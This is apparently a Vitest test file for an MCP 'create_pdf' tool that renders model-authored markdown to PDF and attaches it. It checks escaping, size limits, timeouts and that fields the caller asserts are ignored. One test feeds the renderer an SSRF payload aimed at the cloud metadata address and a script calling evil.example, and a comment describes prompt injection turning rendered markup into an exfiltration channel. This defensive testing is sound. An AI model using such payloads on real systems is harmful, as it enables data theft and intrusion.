import { describe, expect, it, vi } from "vitest";
import { makeFakeClient } from "@/test/mcp-fake-client";
import type { uploadAndRegisterAttachment } from "@/lib/collaboration/attachment-core";
import type { ToolInvokeContext } from "@/lib/mcp/tools/descriptor";
import { makeCreatePdfDescriptor, type RenderPdf } from "./create-pdf";

const ITEM = "11111111-1111-4111-8111-111111111111";
const COLUMN = "22222222-2222-4222-8222-222222222222";
const ACTOR = "00000000-0000-4000-8000-000000000001";

type Attach = typeof uploadAndRegisterAttachment;

const PDF = Buffer.from("%PDF-1.4 pretend");

function ctx(
  spec: Parameters<typeof makeFakeClient>[0] = {},
): ToolInvokeContext {
  const fake = makeFakeClient(spec);
  return { getClient: fake.getClient, actorId: ACTOR };
}

const okRender: RenderPdf = async () => PDF;
const okAttach: Attach = async () => ({
  ok: true,
  data: {
    attachmentId: "att-1",
    storagePath: "o1/b1/i1/x.pdf",
    sizeBytes: PDF.byteLength,
  },
});

const spyRender = () => vi.fn<RenderPdf>(okRender);
const spyAttach = () => vi.fn<Attach>(okAttach);

function tool(deps: { render?: RenderPdf; attach?: Attach } = {}) {
  return makeCreatePdfDescriptor({
    render: deps.render ?? okRender,
    attach: deps.attach ?? okAttach,
  });
}

describe("create_pdf", () => {
  it("declares the capability and scope the grant gate keys off", () => {
    expect(tool()).toMatchObject({
      name: "create_pdf",
      capability: "files.write",
      scope: "itemId",
    });
  });

  it("renders portrait A4 and attaches the bytes as application/pdf", async () => {
    const render = spyRender();
    const attach = spyAttach();
    const r = await tool({ render, attach }).invoke(ctx(), {
      itemId: ITEM,
      fileName: "q3-review",
      content: "# Q3\n\nAll good.",
    });
    expect(r.isError).toBeUndefined();
    // The renderer is handed our own document and the fixed orientation.
    expect(render.mock.calls[0][0]).toContain("<h1>Q3</h1>");
    expect(render.mock.calls[0][1]).toEqual({ landscape: false });
    // Nothing about the stored row is model-asserted except the name.
    expect(attach.mock.calls[0][1]).toMatchObject({
      itemId: ITEM,
      fileName: "q3-review.pdf",
      mimeType: "application/pdf",
    });
    expect(attach.mock.calls[0][1].bytes).toBe(PDF);
    expect(attach.mock.calls[0][2]).toBe(ACTOR);
    expect(JSON.parse(r.content[0].text)).toMatchObject({
      ok: true,
      attachmentId: "att-1",
      fileName: "q3-review.pdf",
      bytes: PDF.byteLength,
    });
  });

  // NOTHING on the stored row may be caller-asserted. The model can put any
  // key it likes in a tool call, so the test supplies the rogue ones a
  // hallucinating (or injected) model would reach for and pins that the fixed
  // constant and the server's own byte count win anyway.
  it("ignores every caller-asserted mime, size and byte claim", async () => {
    const attach = spyAttach();
    const r = await tool({ attach }).invoke(ctx(), {
      itemId: ITEM,
      fileName: "a",
      content: "x",
      // None of these exist in the schema; all are ignored.
      mimeType: "text/html",
      mime_type: "text/html",
      sizeBytes: 999_999,
      bytes: Buffer.from("not the pdf"),
    });
    expect(r.isError).toBeUndefined();
    expect(attach.mock.calls[0][1].mimeType).toBe("application/pdf");
    // The bytes handed on are the RENDERER's, not the caller's.
    expect(attach.mock.calls[0][1].bytes).toBe(PDF);
    // And the reported size is the one the write path returned, not the claim.
    expect(JSON.parse(r.content[0].text).bytes).toBe(PDF.byteLength);
  });

  // The model may never hand us HTML: `renderHtmlToPdf` uses `waitUntil:
  // "networkidle"`, so a surviving tag would be an SSRF/exfiltration channel
  // reachable by prompt injection. What reaches the renderer must be escaped.
  it("never lets model-authored markup reach the renderer", async () => {
    const render = spyRender();
    await tool({ render }).invoke(ctx(), {
      itemId: ITEM,
      fileName: "a",
      content:
        '# T\n\n<img src="http://169.254.169.254/">\n\n' +
        "<script>fetch('https://evil.example')</script>",
    });
    const html = render.mock.calls[0][0];
    const body = html.slice(
      html.indexOf('<main class="doc">'),
      html.indexOf("</main>"),
    );
    expect(body).not.toMatch(/<img|<script|<iframe/i);
    expect(body).toContain("&lt;img");
  });

  it("passes columnId through so a Files column can be targeted", async () => {
    const attach = spyAttach();
    await tool({ attach }).invoke(ctx(), {
      itemId: ITEM,
      columnId: COLUMN,
      fileName: "a",
      content: "x",
    });
    expect(attach.mock.calls[0][1]).toMatchObject({ columnId: COLUMN });
  });

  it("does not double-append an extension the caller already supplied", async () => {
    const attach = spyAttach();
    await tool({ attach }).invoke(ctx(), {
      itemId: ITEM,
      fileName: "BRIEF.PDF",
      content: "x",
    });
    expect(attach.mock.calls[0][1].fileName).toBe("BRIEF.PDF");
  });

  it("refuses source over 128 KB BEFORE launching a browser", async () => {
    const render = spyRender();
    const r = await tool({ render }).invoke(ctx(), {
      itemId: ITEM,
      fileName: "a",
      content: "x".repeat(131_073),
    });
    expect(r.isError).toBe(true);
    expect(r.content[0].text).toMatch(/128 KB/);
    expect(render).not.toHaveBeenCalled();
  });

  it("accepts source exactly at the ceiling", async () => {
    const render = spyRender();
    const r = await tool({ render }).invoke(ctx(), {
      itemId: ITEM,
      fileName: "a",
      content: "x".repeat(131_072),
    });
    expect(r.isError).toBeUndefined();
    expect(render).toHaveBeenCalledTimes(1);
  });

  // A hallucinated id must not cost a Chromium launch.
  it("fails fast on an unknown item without rendering", async () => {
    const render = spyRender();
    const r = await tool({ render }).invoke(
      ctx({ itemScope: { data: null, error: null } }),
      { itemId: ITEM, fileName: "a", content: "x" },
    );
    expect(r.isError).toBe(true);
    expect(r.content[0].text).toBe("Item not found.");
    expect(render).not.toHaveBeenCalled();
  });

  it("surfaces a render failure as an actionable tool error", async () => {
    const attach = spyAttach();
    const r = await tool({
      render: async () => {
        throw new Error("Chromium exited");
      },
      attach,
    }).invoke(ctx(), { itemId: ITEM, fileName: "a", content: "x" });
    expect(r.isError).toBe(true);
    expect(r.content[0].text).toBe("Chromium exited");
    expect(attach).not.toHaveBeenCalled();
  });

  it("gives up on a render that overruns, and a late rejection does not throw", async () => {
    vi.useFakeTimers();
    let reject: (e: Error) => void = () => {};
    const render: RenderPdf = () =>
      new Promise<Buffer>((_, rej) => {
        reject = rej;
      });
    const attach = spyAttach();
    const pending = tool({ render, attach }).invoke(ctx(), {
      itemId: ITEM,
      fileName: "a",
      content: "x",
    });
    await vi.advanceTimersByTimeAsync(45_000);
    const r = await pending;
    expect(r.isError).toBe(true);
    expect(r.content[0].text).toMatch(/45 seconds/);
    expect(attach).not.toHaveBeenCalled();
    // The abandoned render settling later must not become an unhandled
    // rejection that takes the whole run down.
    reject(new Error("too late"));
    await vi.advanceTimersByTimeAsync(0);
    vi.useRealTimers();
  });

  it("surfaces the attach helper's failure verbatim", async () => {
    const r = await tool({
      attach: async () => ({ ok: false, error: "Invalid file column." }),
    }).invoke(ctx(), { itemId: ITEM, fileName: "a", content: "x" });
    expect(r.isError).toBe(true);
    expect(r.content[0].text).toBe("Invalid file column.");
  });

  // `shared.ts:11-14`: each resolution charges the MCP rate limit and rotates
  // the OAuth bridge secret, so a second call is a real defect, not a nicety.
  it("resolves the request client exactly once", async () => {
    const fake = makeFakeClient({});
    await tool().invoke(
      { getClient: fake.getClient, actorId: ACTOR },
      { itemId: ITEM, fileName: "a", content: "x" },
    );
    expect(fake.calls.getClient).toBe(1);
  });
});
